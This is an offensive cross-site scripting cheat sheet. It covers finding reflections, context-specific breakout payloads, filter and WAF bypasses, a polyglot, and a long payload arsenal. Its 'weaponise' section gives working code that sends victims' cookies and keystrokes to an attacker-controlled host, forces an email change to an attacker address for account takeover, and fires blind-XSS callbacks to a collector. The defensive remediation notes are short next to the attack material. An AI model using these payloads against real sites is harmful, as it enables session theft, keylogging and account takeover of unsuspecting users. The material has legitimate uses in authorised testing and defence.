# XSS — Cross-Site Scripting

Inject JavaScript that runs in another user's browser **in the context of the target
site** — steal sessions/cookies, log keystrokes, forge requests as the victim, or take
over accounts. Whatever the user can do on that site, your JS can do too.

Replace placeholders (`<...>`) with your own values: `<target>`, `<your-ip>`, `<port>`.

---
---

# PART 1 — OVERVIEW (at a glance)

## The three types

| Type | Where the payload lives | Delivery | Impact |
|------|------------------------|----------|--------|
| **Reflected** | Echoed straight back in the response (search box, error msg, param) | Victim must click your crafted link | Medium — per-victim, needs interaction |
| **Stored** | Saved server-side (comment, profile, log) and served to everyone | Victim just views the page | **Highest** — hits every viewer, incl. admins |
| **DOM-based** | Client-side JS writes your input into the page; never touches the server | Link or existing page state | Medium/High — invisible to server-side WAFs |

## The workflow (every engagement)

1. **Find** — put a unique marker in every field/param, find where it lands in the response + DOM.
2. **Identify context** — *where* it lands decides the payload (HTML text? attribute? inside `<script>`? URL?).
3. **Break out + execute** — close whatever surrounds you, then run JS. Prove it with `alert(document.domain)`.
4. **Bypass** filters/WAF if the naive payload is blocked.
5. **Weaponise** — turn `alert(1)` into a stolen session / forced action / account takeover.

## Go-to payloads (the reliable ones)

```html
<script>alert(document.domain)</script>     <!-- HTML text context -->
"><img src=x onerror=alert(document.domain)> <!-- break out of an attribute first -->
<svg onload=alert(document.domain)>          <!-- short, no closing tag needed -->
javascript:alert(document.domain)            <!-- href / URL context -->
```

`alert(document.domain)` (not `alert(1)`) — it proves **which origin** the code runs in,
which matters the moment iframes or sandboxes are involved.

## Tools (one-liners)

```bash
dalfox url "http://<target>/?q=FUZZ"           # fast automated scanner, context-aware
XSStrike -u "http://<target>/?q=test"          # payload generation + WAF bypass
# Burp Repeater for manual work; a hosted collector (interactsh / your own server) for blind/stored callbacks
```

## Defender notes (for the report)

- Output-encode **by context** (HTML / attribute / JS / URL) — the single most important control.
- Strict `Content-Security-Policy` (no `unsafe-inline`); `HttpOnly` + `SameSite` on session cookies.
- Framework auto-escaping; avoid `innerHTML` / `document.write` — use `textContent` / `setAttribute`.

---
---

# PART 2 — DETAILED WALKTHROUGH

## Step 1 — Find where input reflects

Inject a **unique marker** (something that won't appear naturally) into every field and
URL parameter, then search the raw response *and* the live DOM for it.

```
?q=xss7391
```

```bash
# grep the raw response (server-side reflections)
curl -s "http://<target>/?q=xss7391" | grep -n "xss7391"
```

**What you're looking for:** where does `xss7391` show up, and *what surrounds it*? That
surrounding is the **context**, and it decides everything about the payload. Check the raw
HTML source (Ctrl+U) **and** the rendered DOM (DevTools → Elements) — DOM XSS only shows in
the latter.

> Tip: if the marker appears in the raw HTML → likely reflected/stored. If it only appears
> in the DOM (not in View-Source) → likely DOM-based, driven by client JS.

---

## Step 2 — Identify the context (this is where beginners get stuck)

Same payload, different surroundings = works or does nothing. Below: what the vulnerable
page renders, what you inject, the resulting HTML, and what happens.

### Context A — Between HTML tags (text node): `<h1>`, `<p>`, `<div>`, `<td>`…

This is the easiest. Your input sits as text *between* an opening and closing tag, so the
browser will parse any new tag you introduce.

```html
<!-- Vulnerable output — your marker lands as element text: -->
<h1>Results for xss7391</h1>
<p>You searched: xss7391</p>
```

You don't need to close anything — just introduce a new executing element:

```html
<!-- inject: -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```

```html
<!-- resulting DOM: -->
<h1>Results for <script>alert(document.domain)</script></h1>
```

**What you see:** an alert box popping the site's origin. `<img src=x onerror=...>` fires
because `x` is not a valid image (the load fails → `onerror` runs) — this is the go-to when
`<script>` is stripped.

> ⚠️ A raw `<script>` injected via `innerHTML` does **not** execute (HTML spec). If your
> input is written with `.innerHTML`, use `<img src=x onerror=...>` or `<svg onload=...>`
> instead — those *do* fire. Plain server-rendered `<script>` in the page body runs fine.

### Context B — Inside "raw text" tags: `<title>`, `<textarea>`, `<style>`, `<script>` comment

Some elements treat their content as plain text — tags inside them are NOT parsed. You must
**close the tag first**, then inject.

```html
<!-- Vulnerable output: -->
<textarea>xss7391</textarea>
<title>xss7391</title>
```

```html
<!-- inject — close the host tag, then your payload: -->
</textarea><script>alert(document.domain)</script>
</title><svg onload=alert(document.domain)>
```

### Context C — Inside an HTML attribute value

Your input lands inside a quoted (or unquoted) attribute. Break out of the attribute/tag first.

```html
<!-- Vulnerable output — inside value="": -->
<input type="text" value="xss7391">
```

```html
<!-- inject (double-quote context): close the quote + tag, then a new element -->
"><svg onload=alert(document.domain)>

<!-- resulting DOM: -->
<input type="text" value=""><svg onload=alert(document.domain)>
```

If you can't break out of the tag (e.g. `>` is filtered) but you *can* close the quote,
add a new event-handler attribute instead:

```html
<!-- inject: -->
" autofocus onfocus=alert(document.domain) x="

<!-- resulting DOM (autofocus fires onfocus immediately): -->
<input type="text" value="" autofocus onfocus=alert(document.domain) x="">
```

```html
<!-- unquoted attribute? just add a space + handler: -->
<!-- output: <input value=xss7391> -->
x onmouseover=alert(document.domain)
```

### Context D — Inside an existing `<script>` block (JavaScript context)

Your input is placed *inside JS code*, usually within a string. You're not injecting HTML —
you're injecting **JavaScript**. Break out of the string/statement.

```html
<!-- Vulnerable output: -->
<script>
  var q = "xss7391";
  search(q);
</script>
```

```js
// inject — close the string and statement, run your code, comment out the rest:
";alert(document.domain);//

// resulting JS:
var q = "";alert(document.domain);//";
```

```html
<!-- Or escape the whole script element and start a fresh one: -->
</script><script>alert(document.domain)</script>
```

If you're inside a template literal use a backtick; inside single quotes use `'`. Match the
quote the code uses.

### Context E — URL / href / src attribute (the `javascript:` scheme)

When your input becomes a link target, you don't need a tag — the scheme itself executes.

```html
<!-- Vulnerable output: -->
<a href="xss7391">click</a>
```

```html
<!-- inject: -->
javascript:alert(document.domain)

<!-- resulting DOM (fires when the victim clicks the link): -->
<a href="javascript:alert(document.domain)">click</a>
```

### Context F — DOM-based (client-side sink)

No server involvement. Client JS reads attacker-controlled input (`location.hash`,
`location.search`, `document.referrer`, `postMessage`) and writes it into a dangerous
**sink** (`innerHTML`, `document.write`, `eval`, `setAttribute`).

```js
// Vulnerable client code:
document.getElementById('out').innerHTML = location.hash.slice(1);
```

```
// attack URL — payload after the # never reaches the server (WAF blind to it):
http://<target>/page#<img src=x onerror=alert(document.domain)>
```

Common sinks to grep for in JS: `innerHTML`, `outerHTML`, `document.write`, `eval`,
`setTimeout`, `Function`, `location`, `jQuery $(...)`, `.html()`.

---

## Per-tag / per-context cheat table

| Where your input lands | Example server output | Payload to inject |
|------------------------|-----------------------|-------------------|
| `<h1>` / `<p>` / `<div>` text | `<p>HERE</p>` | `<img src=x onerror=alert(document.domain)>` |
| `<textarea>` / `<title>` | `<textarea>HERE</textarea>` | `</textarea><svg onload=alert(document.domain)>` |
| Quoted attribute | `<input value="HERE">` | `"><svg onload=alert(document.domain)>` |
| Attribute, `>` filtered | `<input value="HERE">` | `" autofocus onfocus=alert(document.domain) x="` |
| Unquoted attribute | `<input value=HERE>` | `x onmouseover=alert(document.domain)` |
| Inside `<script>` string | `var q="HERE"` | `";alert(document.domain)//` |
| `href` / `src` | `<a href="HERE">` | `javascript:alert(document.domain)` |
| DOM sink (`innerHTML` via hash) | `el.innerHTML=location.hash` | `#<img src=x onerror=alert(document.domain)>` |

---

## Step 3 — Filter / WAF bypasses

Try the naive payload first; only escalate when something is blocked.

```html
<!-- Case / mixed-case (naive keyword filters): -->
<ScRiPt>alert(document.domain)</ScRiPt>
<img src=x oNeRror=alert(document.domain)>

<!-- No parentheses allowed: -->
<img src=x onerror=alert`document.domain`>

<!-- The word "script" is stripped — use script-less executing elements: -->
<svg/onload=alert(document.domain)>
<body onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<video><source onerror=alert(document.domain)>

<!-- Space filtered — use a slash: -->
<svg/onload=alert(document.domain)>

<!-- HTML-entity / URL / double-URL encoding to slip past filters: -->
&#60;script&#62;alert(document.domain)&#60;/script&#62;
%3Cscript%3Ealert(document.domain)%3C/script%3E
```

**Event handlers to rotate through** when `onerror`/`onload` are blocked:
`onmouseover onfocus ontoggle onanimationstart onpointerover oninput onbeforetoggle`

**Polyglot** (one string that fires across many contexts — good for spraying):

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

## Step 4 — Weaponise (turn alert into impact)

Start a listener on your box, then deliver a payload that calls back to it.

```bash
# your collector — any GET hitting it dumps to your terminal:
python3 -m http.server <port>
# or, to see full request lines:
nc -lvnp <port>
```

### Steal cookies (only works if NOT HttpOnly)

```html
<script>new Image().src='http://<your-ip>:<port>/c?'+document.cookie</script>
<script>fetch('http://<your-ip>:<port>/c?'+encodeURIComponent(document.cookie))</script>
```

```
# what you see in your listener when a victim triggers it:
10.10.10.5 - - [11/Sep/2026 10:42:01] "GET /c?session=eyJ1c2VyIjoiYWRtaW4ifQ HTTP/1.1" 200 -
```

Take that `session=...` value, drop it into your browser's cookie store (DevTools →
Application → Cookies) or a `Cookie:` header, refresh — you're now logged in as the victim.

### Keylogger

```html
<script>document.onkeypress=e=>fetch('http://<your-ip>:<port>/k?'+e.key)</script>
```

### Force an action as the victim (defeats CSRF tokens — the JS reads them)

```html
<script>fetch('/account/email',{method:'POST',credentials:'include',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'email=attacker@evil.com'})</script>
```

`credentials:'include'` sends the victim's cookies, so the request is fully authenticated.
This is how XSS beats CSRF tokens: your script fetches the page, reads the token out of the
DOM, and submits it.

### HttpOnly cookies? Pivot instead of reading them

You can't read an `HttpOnly` cookie from JS — so don't try. Instead **ride the session**:
issue authenticated `fetch()` calls (as above) to change the email/password → account
takeover, or exfiltrate data the victim can see.

### Blind / stored XSS (you never see the page)

Fire a callback to a collector so you know when/where it executed (e.g. an admin panel):

```html
<script src="http://<your-ip>:<port>/x.js"></script>
<img src=x onerror="fetch('https://<id>.oast.fun/'+document.domain)">
```

```bash
interactsh-client            # gives you a unique .oast.fun host + logs every hit (DNS/HTTP)
```

---

## Step 5 — Tools (with what to expect)

### dalfox — fast, context-aware scanner

```bash
dalfox url "http://<target>/?q=FUZZ"
dalfox url "http://<target>/search" -d "q=FUZZ" --cookie "session=..."   # POST + authed
cat urls.txt | dalfox pipe                                                # bulk
```

```
# expected output — dalfox reports the reflection point, context, and a verified payload:
[POC][V][GET] http://<target>/?q=<svg/onload=alert(1)>
[i] Reflected param: q  (in-html)
```

### XSStrike — payload generation + WAF fingerprint/bypass

```bash
XSStrike -u "http://<target>/?q=test"
XSStrike -u "http://<target>/" --data "q=test" --fuzzer   # POST, fuzz the filter
```

### Burp Suite

- **Repeater** — manual: send the request, tweak the payload, read the response for your
  marker/context. Best for understanding *why* something is or isn't reflected.
- **Intruder** — spray a payload list across the param to find what the filter lets through.
- **Collaborator** (Pro) or **interactsh** — catch blind/stored callbacks.

---

## Defender / remediation (put this in the report)

- **Context-aware output encoding** is the core fix: HTML-encode in HTML text, attribute-encode
  in attributes, JS-encode in scripts, URL-encode in URLs. Encoding for the wrong context is
  still a bug.
- **Content-Security-Policy**: `default-src 'self'; script-src 'self'` (no `unsafe-inline`,
  no wildcard). Turns most injections into inert, blocked resources.
- **Cookies**: `HttpOnly` (JS can't read them) + `SameSite=Lax/Strict` + `Secure`.
- **Avoid dangerous sinks**: prefer `textContent`/`setAttribute` over `innerHTML`/`document.write`;
  never `eval()` user input.
- Framework auto-escaping (React/Angular/etc.) — and don't defeat it with
  `dangerouslySetInnerHTML` / `[innerHTML]` / `v-html` on untrusted data.

---
---

# PART 3 — PAYLOAD ARSENAL (PortSwigger-style reference)

A copy-paste reference for **once you've found a reflection and need a vector that survives
the filter**. Part 2 teaches you *where* to inject; this part gives you *what* to try. Swap
`alert(document.domain)` for your exfil/weaponise payload from Part 2.

> Note: browsers differ and remove old vectors over time. If one doesn't fire, rotate to the
> next — that's the whole point of having a list.

## Auto-firing vectors (no user interaction needed)

These execute the moment the element is parsed/rendered — best for reflected/stored where you
can't rely on the victim doing anything.

```html
<script>alert(document.domain)</script>
<svg onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>
<body onload=alert(document.domain)>
<iframe onload=alert(document.domain)>
<input autofocus onfocus=alert(document.domain)>          <!-- also: select/textarea autofocus onfocus -->
<details open ontoggle=alert(document.domain)>
<video><source onerror=alert(document.domain)></video>
<audio src=x onerror=alert(document.domain)>
<object data="javascript:alert(document.domain)"></object>
<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s></svg>
<svg><set onbegin=alert(document.domain) attributeName=x></svg>
<!-- CSS-animation trigger (define keyframes, then any element): -->
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart=alert(document.domain)></xss>
<!-- legacy / older browsers: -->
<marquee onstart=alert(document.domain)>          <!-- legacy -->
<meta http-equiv=refresh content="0;url=javascript:alert(document.domain)">  <!-- legacy -->
```

## Interaction-based vectors (need hover / click / keypress)

Fine for stored XSS on a page the victim will actually use (buttons, links, comment areas).

```html
<a href="javascript:alert(document.domain)">click me</a>
<div onmouseover=alert(document.domain)>hover me</div>
<x onclick=alert(document.domain)>click me</x>
<div onpointerover=alert(document.domain)>hover me</div>
<input onchange=alert(document.domain)>            <!-- fires on edit + blur -->
<body onresize=alert(document.domain)>             <!-- fires when window resizes -->
```

## Event-handler reference

| Fires automatically | Needs interaction |
|---------------------|-------------------|
| `onload` `onerror` `onfocus`(+`autofocus`) `ontoggle`(`<details open>`) `onbegin`(svg `<animate>`) `onanimationstart`(+CSS) `onpageshow` `onstart`(legacy `<marquee>`) | `onclick` `onmouseover` `onmousemove` `onpointerover` `onpointerenter` `onkeydown` `onwheel` `oninput` `onchange` `ondblclick` `oncontextmenu` |

## Tag → working payload (quick grid)

| Tag | Fires on | Payload |
|-----|----------|---------|
| `<script>` | parse | `<script>alert(document.domain)</script>` |
| `<svg>` | load | `<svg onload=alert(document.domain)>` |
| `<img>` | bad src → error | `<img src=x onerror=alert(document.domain)>` |
| `<body>` | load | `<body onload=alert(document.domain)>` |
| `<iframe>` | load | `<iframe onload=alert(document.domain)>` |
| `<input>` | autofocus | `<input autofocus onfocus=alert(document.domain)>` |
| `<details>` | open toggle | `<details open ontoggle=alert(document.domain)>` |
| `<video>`/`<audio>` | source error | `<video><source onerror=alert(document.domain)>` |
| `<object>` | data URI | `<object data="javascript:alert(document.domain)">` |
| `<a>` | click | `<a href="javascript:alert(document.domain)">x</a>` |
| `<marquee>` | start (legacy) | `<marquee onstart=alert(document.domain)>` |

## Filter-bypass variants

```html
<!-- No parentheses (WAF blocks "(") -->
<img src=x onerror=alert`document.domain`>
<svg onload=alert&lpar;document.domain&rpar;>            <!-- HTML entities decode inside the attribute -->
<img src=x onerror="window.onerror=eval;throw'=alert\x28document.domain\x29'">

<!-- No spaces (WAF blocks " ") -->
<svg/onload=alert(document.domain)>
<img/src/onerror=alert(document.domain)>
<svg//onload=alert(document.domain)>

<!-- No quotes needed (unquoted attribute context) -->
<svg onload=alert(document.domain)>

<!-- Encoded delivery (bypass keyword filters) -->
&#x3C;script&#x3E;alert(document.domain)&#x3C;/script&#x3E;    <!-- hex entities -->
%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E            <!-- URL encode -->
<a href="&#106;avascript:alert(document.domain)">x</a>       <!-- entity-hide "javascript:" -->
```

## When `alert` itself is blocked / for blind XSS

```js
print(document.domain)
confirm(document.domain)
prompt(document.domain)
eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))   // base64 of alert(document.domain)
top['al'+'ert'](document.domain)                  // string-split to dodge "alert" filters
```

## Client-side template injection (if the app uses a JS template framework)

```html
<!-- AngularJS sandbox escape (older versions) — try if you see ng-app / {{ }} evaluated: -->
{{constructor.constructor('alert(document.domain)')()}}
{{$on.constructor('alert(document.domain)')()}}
```

---

**Key idea:** XSS is code execution in the victim's browser under the *site's* origin. The
**type** (reflected / stored / DOM) sets how you deliver it; the **context** (where your
input lands) sets the payload. The win is turning `alert(1)` into a stolen session, a forced
account action, or full account takeover.
